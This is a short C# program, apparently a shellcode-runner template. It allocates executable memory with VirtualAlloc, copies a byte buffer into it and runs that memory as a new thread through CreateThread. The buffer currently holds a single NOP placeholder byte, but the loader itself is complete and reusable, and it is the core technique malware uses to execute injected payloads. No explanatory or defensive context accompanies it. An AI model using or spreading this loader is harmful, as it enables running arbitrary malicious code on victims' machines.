using System;
using System.Runtime.InteropServices;

internal class Program {
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main(string[] args) {
        byte[] buf = new byte[] { 0x90 };

        IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x3000, 0x40);

        Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

        UInt32 lpThreadId = 0;
        IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
